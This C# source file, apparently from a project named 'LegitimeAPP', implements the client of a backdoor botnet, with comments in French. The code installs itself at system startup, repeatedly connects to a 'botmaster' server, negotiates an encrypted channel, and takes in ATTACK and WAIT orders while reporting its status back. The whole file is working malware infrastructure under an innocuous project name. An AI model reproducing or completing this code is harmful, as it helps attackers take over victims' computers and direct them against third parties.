using System ;
using System.Net ;
using System.Net.Sockets ;
using System.Text;
using LegitimeAPP.Shared ;
using LegitimeAPP.OS ; 

namespace LegitimeAPP.Backdoor {
    public class Connection {
        private IPAddress _masterIP ;
        private int _masterPort ;

        private Boolean _attackInProgress ; 
        private Stream stm ;
        private TcpClient tcp ;

        // Thread 
        private Thread _FollowingOrders ;
        private Thread _ConnectionRequests ;

        private Order order ;


        // Encryption

        private Backdoor.Encryption _encryption ; 
        // Encoding 

        private ASCIIEncoding enc = new ASCIIEncoding() ;


        public Connection(string masterIP, int masterPort) {


            _encryption = new Encryption() ; 



            order = new Order(TypeAction.WAIT) ;

            /*
            Pour mettre le programme en démarrage de l'ordinateur
            Pour l'instant ne fonctionne que sur Windows 
            */
            _ = new Startup() ; 


            order.NewAttackOrder += delegate {
                Console.WriteLine("L'attaque est on") ;

                WriteNetMessage(Encryption.Encrypt(Data<Order>.DataToXml(new Order(TypeAction.ATTACK)),_encryption.SymmetricKey)) ;

                _attackInProgress = true ; 
            } ;

            order.EndAttackOrder += delegate {
                Console.WriteLine("L'attaque est off") ;

               WriteNetMessage(Encryption.Encrypt(Data<Order>.DataToXml(new Order(TypeAction.WAIT)),_encryption.SymmetricKey)) ; 
                

                _attackInProgress = false ;  
            } ;  

            _attackInProgress = false; 


            enc = new ASCIIEncoding() ;

            _masterIP = IPAddress.Parse(masterIP) ;
            _masterPort = masterPort ;

            _ConnectionRequests = new Thread(MakeConnectionRequest) ;
            _ConnectionRequests.Name = "Requête de connexion " ;

            _FollowingOrders = new Thread(ListeningOrder) ;
            _FollowingOrders.Name = "" ;

            _ConnectionRequests.Start() ;
        }



        /*

        Ecriture et lecture des messages envoyés et reçu par le serveur 

        */


        private byte[] GetRawIncomingMessage() {
            byte[] response = new byte[1024] ;
            int sizeResponse = stm.Read(response, 0, 1024) ;

            return response ; 
        }
        private string GetIncomingMessage() {
            byte[] responseRaw = new byte[1024] ;
            string response = "" ; 
            int sizeResponse = stm.Read(responseRaw,0,1024) ;
            for (int i = 0 ; i < sizeResponse ; i++) {
                response += Convert.ToChar(responseRaw[i]);
            }
            return response ;  
        }

        private void WriteNetMessage(string mess) {
            stm.Write(enc.GetBytes(mess)) ;
        }

        private void WriteNetMessage(byte[] mess) {
            stm.Write(mess) ; 
        }



        public bool IsConnected
{
    get
    {
        try
        {
            if (tcp != null && tcp.Client != null && tcp.Client.Connected)
            {
               /* pear to the documentation on Poll:
                * When passing SelectMode.SelectRead as a parameter to the Poll method it will return 
                * -either- true if Socket.Listen(Int32) has been called and a connection is pending;
                * -or- true if data is available for reading; 
                * -or- true if the connection has been closed, reset, or terminated; 
                * otherwise, returns false
                */

                // Detect if client disconnected
                if (tcp.Client.Poll(0, SelectMode.SelectRead))
                {
                    byte[] buff = new byte[1];
                    if (tcp.Client.Receive(buff, SocketFlags.Peek) == 0)
                    {
                        // Client disconnected
                        return false;
                    }
                    else
                    {
                        return true;
                    }
                }

                return true;
            }
            else
            {
                return false;
            }
        }
        catch
        {
            return false;
        }
    }
}

        private void ListeningOrder() {

            while(true) {

                try {
                    if ( IsConnected ) {
                    // Récupère et déchiffre le nouveau message 
                    string message = Encryption.Decrypt(GetIncomingMessage(), _encryption.SymmetricKey) ;

                    /*
                    Dans le cas ou une attaque est en cours ignorer le nouvelle ordre
                    */

                    if ( !_attackInProgress ) {
                        
                       
                        order.Change(Data<Order>.XmlToData(message)) ;
                        order.Start() ;

                    } else {
                        
                        Console.WriteLine("On ignore le nouvelle ordre car un est encore en cours ") ; 
                    }
                     
                } else {
                    Console.WriteLine("Le serveur ne répond plus. Déconnection...") ; 
                     break ;
                }
                } catch( Exception ex) {
                    Console.WriteLine("[Exception]"+ex.Message) ;
                    Console.WriteLine("[Trace]"+ex.StackTrace) ; 
                }


               Thread.Sleep(1000) ; 
                
            }
        }




        private void MakeConnectionRequest() {

            while (true) {

                
            tcp = new TcpClient() {
                SendTimeout = 1000
            }  ;



                try {
                    tcp.Connect(_masterIP, _masterPort) ;


                    stm = tcp.GetStream() ;


                    Console.WriteLine("On envoie la clé publique") ;
                    // On envoie la clé asymétrique publique 
                    WriteNetMessage(_encryption.GetPublicKey) ;

                    Console.WriteLine("On reçois la clé symétrique") ; 
                    _encryption.SymmetricKey = _encryption.Decrypt(GetRawIncomingMessage()) ;

                    Console.WriteLine("Clé reçu ! Voici la clé " + _encryption.SymmetricKey) ;
            
                    if ( _attackInProgress) {
                        order.Stop() ;

                        Console.WriteLine("Nouvelle Connexion !  On annule l'attaque en cours !") ; 
                    }


                    Console.WriteLine("La connexion avec le botmaster est un succès") ;


                    

                   Console.WriteLine("L'attaque est en cours : " + (_attackInProgress ? "Oui" : "Non")) ;
                // On démarre le Thread lorsque la connexion est une réussite


                // Reset le Thread dans le cas ou il a déjà été lancé
                    if (_FollowingOrders.ThreadState == ThreadState.Stopped)
                    {  
                        _FollowingOrders = new Thread(ListeningOrder) ; 
                    } 
                
                    _FollowingOrders.Start() ;
                    _FollowingOrders.Join() ;
                } catch (Exception ex) {
                    Console.WriteLine(" [ Exception ] La connexion au BotMaster est un échec... Code d'erreur : " + ex.Message +"... Tentative dans cinq secondes... "  ) ;

                    Console.WriteLine("[ Trace ] "+ex.StackTrace) ; 
                } 



/*
                try {
                if ( tcp.ConnectAsync(_masterIP, _masterPort).Wait(1000)) {
                    stm = tcp.GetStream() ;

                    WriteNetMessage("1") ; 
                    Console.WriteLine("La connexion avec le botmaster est un succès") ; 

                // On démarre le Thread lorsque la connexion est une réussite


                // Reset le Thread dans le cas ou il a déjà été lancé
                    if (_FollowingOrders.ThreadState == ThreadState.Stopped)
                    {  
                        _FollowingOrders = new Thread(ListeningOrder) ; 
                    } 
                
                    _FollowingOrders.Start() ; 
                    _FollowingOrders.Join() ;
                } else {
                    Console.WriteLine("La connexion au BotMaster ne répond pas... Nouvelle Tentative dans cinq secondes ") ; 
                }
                } catch(Exception ex) {
                    Console.WriteLine("La connexion au BotMaster est impossible... Message d'erreur : " + ex.Message + "... Tentative dans cinq secondes...") ; 
                }
               
                */
/*
            } catch (Exception e) 
            {   
                Console.WriteLine("La connexion au BotMaster à échoué... Nouvelle tentative dans 5 secondes  ") ;
            } */
                Thread.Sleep(5000) ;  
            }
        }
    }
}